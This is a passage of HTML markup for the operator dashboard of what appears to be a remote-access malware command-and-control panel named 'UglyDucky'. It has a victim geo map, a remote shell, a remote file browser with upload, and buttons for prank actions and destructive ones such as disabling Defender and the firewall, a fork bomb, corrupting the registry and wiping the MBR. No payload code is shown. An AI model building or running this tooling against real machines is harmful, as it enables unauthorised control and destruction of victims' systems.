                            </div>
                        </div>
                    </div>
                </div>

                <div class="resizer-v" id="rz-v1"></div>

                <!-- COLUMN MID -->
                <div id="col-mid" class="tiling-col" style="flex-basis: 50%;">
                    <div class="drag-slot" id="slot-2" style="flex-basis: 50%;">
                        <div id="panel-map" class="drag-panel" data-minimized="false">
                            <div class="draggable-header p-2 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center rounded-t-[0.75rem]" draggable="true">
                                <h2 class="font-bold text-xs tracking-wider uppercase text-gray-300 pointer-events-none"><i class="fa-solid fa-earth-americas text-cyberBlue mr-2 text-glow-blue"></i>Geo Map</h2>
                                <div class="flex gap-2 flex-shrink-0">
                                    <button onclick="toggleMinimize(this, 'panel-map')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 hover:bg-yellow-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button>
                                    <button onclick="toggleMaximize(this, 'panel-map')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button>
                                </div>
                            </div>
                            <div class="win-content flex flex-col rounded-b-[0.75rem]" style="overflow: hidden; padding: 0;">
                                <div id="map-container" class="w-full h-full flex-grow bg-[#0B0F19] z-0"></div>
                            </div>
                        </div>
                    </div>

                    <div class="resizer-h" id="rz-h1"></div>

                    <div class="drag-slot" id="slot-3" style="flex-basis: 50%;">
                        <div id="panel-terminal" class="drag-panel" data-minimized="false">
                            <div class="draggable-header p-2 border-b border-gray-800 bg-[#0B0F19] flex justify-between items-center rounded-t-[0.75rem]" draggable="true">
                                <div class="flex gap-1.5 ml-1 pointer-events-none">
                                    <div class="w-2.5 h-2.5 rounded-full bg-red-500"></div><div class="w-2.5 h-2.5 rounded-full bg-yellow-500"></div><div class="w-2.5 h-2.5 rounded-full bg-green-500"></div>
                                </div>
                                <span class="text-[10px] font-mono text-gray-500 pointer-events-none">ducky@c2-server:~</span>
                                <div class="flex gap-2 mr-1 flex-shrink-0">
                                    <button onclick="document.getElementById('terminal-output').innerHTML=''" class="text-gray-500 hover:text-white text-[10px]" title="Clear Shell"><i class="fa-solid fa-trash"></i></button>
                                    <button onclick="toggleMinimize(this, 'panel-terminal')" class="text-yellow-500 hover:text-white text-[10px]"><i class="fa-solid fa-minus"></i></button>
                                    <button onclick="toggleMaximize(this, 'panel-terminal')" class="text-green-500 hover:text-white text-[10px]"><i class="fa-solid fa-expand"></i></button>
                                </div>
                            </div>
                            <div class="win-content p-3 font-mono text-xs bg-black/80 text-gray-300 flex flex-col rounded-b-[0.75rem]">
                                <div class="flex-grow overflow-y-auto" id="terminal-output">
                                    <div class="text-cyberBlue">UglyDucky Shell v2.5.0</div>
                                    <div class="text-gray-500" id="terminal-connection-msg">Connecting...</div>
                                    <div class="mt-2 text-green-400 terminal-prompt flex flex-shrink-0">
                                        <span class="mr-2">C:\Users\System></span> <span class="cursor-blink"></span>
                                    </div>
                                </div>
                                <div class="pt-2 border-t border-gray-800 flex mt-2 flex-shrink-0">
                                    <span class="text-neon font-bold mr-2">></span>
                                    <input type="text" placeholder="Enter shell command..." class="w-full bg-transparent outline-none font-mono text-xs text-white placeholder-gray-600" onkeypress="if(event.key === 'Enter') executeTermCommand(this)">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="resizer-v" id="rz-v2"></div>

                <!-- COLUMN RIGHT -->
                <div id="col-right" class="tiling-col" style="flex-basis: 25%;">
                    <div class="drag-slot" id="slot-4" style="flex-basis: 50%;">
                        <div id="panel-modules" class="drag-panel" data-minimized="false">
                            <div class="draggable-header p-2 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center rounded-t-[0.75rem]" draggable="true">
                                <h2 class="font-bold text-xs tracking-wider uppercase text-gray-300 pointer-events-none"><i class="fa-solid fa-bolt text-yellow-400 mr-2"></i>Modules</h2>
                                <div class="flex gap-2 flex-shrink-0">
                                    <button onclick="toggleMinimize(this, 'panel-modules')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 hover:bg-yellow-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button>
                                    <button onclick="toggleMaximize(this, 'panel-modules')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button>
                                </div>
                            </div>
                            <div class="win-content p-2 space-y-4 bg-[#050810]/50 rounded-b-[0.75rem]">
                                
                                <!-- Troll & Fun Section -->
                                <div>
                                    <h3 class="text-[9px] font-bold text-cyberBlue uppercase mb-2 tracking-wider pl-1 border-b border-gray-800 pb-1">Troll & Disruption</h3>
                                    <div class="grid grid-cols-2 gap-1.5">
                                        <!-- Rickroll -->
                                        <button onclick="termLog('Command queued: Open Rickroll')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-red-500/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-brands fa-youtube text-red-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Rickroll</h4>
                                        </button>
                                        <!-- CD Tray -->
                                        <button onclick="termLog('Command queued: Eject CD Tray')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-gray-400 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-compact-disc text-gray-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Open CD Tray</h4>
                                        </button>
                                        <!-- Beep -->
                                        <button onclick="termLog('Command queued: Play Beep Sound')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-yellow-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-bell text-yellow-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Play Beep</h4>
                                        </button>
                                        <!-- Max Volume -->
                                        <button onclick="termLog('Command queued: Force Max Volume')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-blue-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-volume-high text-blue-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Max Volume</h4>
                                        </button>
                                        <!-- Fake Update -->
                                        <button onclick="termLog('Command queued: Fake Windows Update')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-sky-500/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-brands fa-windows text-sky-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Fake Update</h4>
                                        </button>
                                        <!-- Swap Mouse -->
                                        <button onclick="termLog('Command queued: Swap Mouse Buttons')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-purple-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-computer-mouse text-purple-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Swap Mouse</h4>
                                        </button>
                                        <!-- Jiggle -->
                                        <button onclick="termLog('Command queued: Jiggle Cursor')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-pink-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-arrows-up-down-left-right text-pink-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Mouse Jiggle</h4>
                                        </button>
                                        <!-- Rotate Screen -->
                                        <button onclick="termLog('Command queued: Rotate Screen 180°')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-emerald-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-rotate text-emerald-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Rotate Screen</h4>
                                        </button>
                                        <!-- Hide Icons -->
                                        <button onclick="termLog('Command queued: Hide Desktop Icons')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-slate-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-eye-slash text-slate-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Hide Icons</h4>
                                        </button>
                                        <!-- Rainbow Screen -->
                                        <button onclick="termLog('Command queued: Rainbow Flash FX')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-indigo-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-palette text-indigo-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Rainbow FX</h4>
                                        </button>
                                        <!-- Spam Popups -->
                                        <button onclick="termLog('Command queued: Spam Error Popups')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-orange-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-message text-orange-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">Spam Popups</h4>
                                        </button>
                                        <!-- TTS Message -->
                                        <button onclick="termLog('Command queued: TTS Voice Message')" class="bg-[#1a2235] hover:bg-[#1a2235] border border-gray-800 hover:border-cyan-400/50 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-microphone text-cyan-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white">TTS Message</h4>
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Powerful Section -->
                                <div>
                                    <h3 class="text-[9px] font-bold text-red-500 uppercase mb-2 tracking-wider pl-1 border-b border-red-900/50 pb-1"><i class="fa-solid fa-skull mr-1"></i> Powerful</h3>
                                    <div class="grid grid-cols-2 gap-1.5">
                                        <button onclick="termLog('Command queued: System Restart')" class="bg-[#1a2235] hover:bg-red-900/40 border border-gray-800 hover:border-red-500/80 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-power-off text-red-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">REBOOT PC</h4>
                                        </button>
                                        <button onclick="triggerBSOD()" class="bg-[#1a2235] hover:bg-orange-900/40 border border-gray-800 hover:border-orange-500/80 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-biohazard text-orange-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">TRIGGER BSOD</h4>
                                        </button>
                                        <button onclick="triggerScorchedEarth()" class="bg-[#1a2235] hover:bg-red-900/50 border border-gray-800 hover:border-red-500 shadow-[0_0_10px_rgba(255,0,0,0.1)] p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-burst text-red-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">SELF DESTRUCT</h4>
                                        </button>
                                        <button onclick="termLog('Command queued: Disable Defender/Antivirus')" class="bg-[#1a2235] hover:bg-yellow-900/40 border border-gray-800 hover:border-yellow-600/80 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-shield-virus text-yellow-600 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">DROP DEFENDER</h4>
                                        </button>
                                        <button onclick="termLog('Command queued: Execute Fork Bomb')" class="bg-[#1a2235] hover:bg-purple-900/40 border border-gray-800 hover:border-purple-500/80 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-bomb text-purple-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">FORK BOMB</h4>
                                        </button>
                                        <button onclick="termLog('Command queued: Corrupt Windows Registry')" class="bg-[#1a2235] hover:bg-amber-900/40 border border-gray-800 hover:border-amber-500/80 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-gears text-amber-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">NUKE REGISTRY</h4>
                                        </button>
                                        <button onclick="termLog('Command queued: Lock User Account')" class="bg-[#1a2235] hover:bg-rose-900/40 border border-gray-800 hover:border-rose-500/80 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-user-lock text-rose-500 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">LOCK ACCOUNT</h4>
                                        </button>
                                        <button onclick="termLog('Command queued: Overwrite Master Boot Record')" class="bg-[#1a2235] hover:bg-stone-800/40 border border-gray-800 hover:border-stone-400/80 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-hard-drive text-stone-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">WIPE MBR</h4>
                                        </button>
                                        <button onclick="termLog('Command queued: Disable Windows Firewall')" class="bg-[#1a2235] hover:bg-red-900/30 border border-gray-800 hover:border-red-400/80 p-1.5 rounded text-center transition-colors group">
                                            <i class="fa-solid fa-fire-extinguisher text-red-400 mb-1"></i><h4 class="text-[9px] text-gray-300 group-hover:text-white font-bold">DROP FIREWALL</h4>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="resizer-h" id="rz-h-right"></div>

                    <div class="drag-slot" id="slot-fs" style="flex-basis: 50%;">
                        <div id="panel-fs" class="drag-panel transition-transform duration-300" data-minimized="false">
                            <div class="draggable-header p-2 border-b border-gray-800 bg-[#0f1423] flex justify-between items-center rounded-t-[0.75rem]" draggable="true">
                                <h2 class="font-bold text-[10px] tracking-wider uppercase text-gray-300 pointer-events-none truncate"><i class="fa-solid fa-folder-tree text-cyberBlue mr-2 text-glow-blue"></i>FS: <span id="fs-active-node" class="text-gray-500 font-mono">None</span></h2>
                                <div class="flex gap-2 flex-shrink-0">
                                    <button onclick="requestDirectoryListing(currentFsPath || 'DRIVES')" class="w-4 h-4 rounded-full bg-blue-500/20 text-blue-500 hover:bg-blue-500 hover:text-white flex items-center justify-center text-[8px]" title="Refresh"><i class="fa-solid fa-rotate-right"></i></button>
                                    <button onclick="toggleMinimize(this, 'panel-fs')" class="w-4 h-4 rounded-full bg-yellow-500/20 text-yellow-500 hover:bg-yellow-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-minus"></i></button>
                                    <button onclick="toggleMaximize(this, 'panel-fs')" class="w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]"><i class="fa-solid fa-expand"></i></button>
                                </div>
                            </div>
                            
                            <div class="p-1 border-b border-gray-800 flex items-center gap-1 flex-shrink-0 bg-[#050810]">
                                <button onclick="navigateUp()" id="fsUpBtn" class="px-2 py-1 bg-gray-800 hover:bg-gray-700 rounded text-[10px]"><i class="fa-solid fa-arrow-up"></i></button>
                                <div id="fsBreadcrumbs" class="flex-grow p-1 bg-[#0B0F19] rounded border border-gray-800 text-[10px] font-mono flex items-center gap-1 overflow-x-auto whitespace-nowrap no-scrollbar"></div>
                                <button onclick="triggerUpload()" class="px-2 py-1 bg-cyberBlue/20 text-cyberBlue hover:bg-cyberBlue hover:text-white border border-cyberBlue rounded text-[10px] font-bold transition-all"><i class="fa-solid fa-upload"></i></button>
                                <input type="file" id="fileUploadInput" class="hidden">
                            </div>
                            
                            <div class="win-content bg-[#0f1423]/80 rounded-b-[0.75rem]">
                                <table class="w-full text-[10px] text-left table-fixed">
                                    <thead class="sticky top-0 bg-[#050810] z-10 border-b border-gray-700 shadow-sm">
                                        <tr class="text-gray-400 font-mono uppercase">
                                            <th class="p-1.5 pl-2 w-8"></th>
                                            <th class="p-1.5 w-auto">Name</th>
                                            <th class="p-1.5 w-16 text-right">Size</th>
                                            <th class="p-1.5 w-20 text-center">Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody id="fsTbody" class="font-mono text-gray-300">
                                        <tr><td colspan="4" class="text-center p-4 text-gray-600">Select target node to load files...</td></tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </main>

    <!-- Toast -->
    <div id="toast" class="fixed bottom-5 right-5 bg-gray-900 border-l-4 border-neon text-white px-6 py-4 rounded shadow-2xl transition-transform transform translate-y-24 opacity-0 z-[110] flex items-center gap-3">
        <i class="fa-solid fa-circle-check text-neon" id="toastIcon"></i>
        <span id="toastMsg" class="font-mono text-sm">Action successful!</span>
    </div>

    <script src="app.js?version=7000"></script>
</body>
</html>
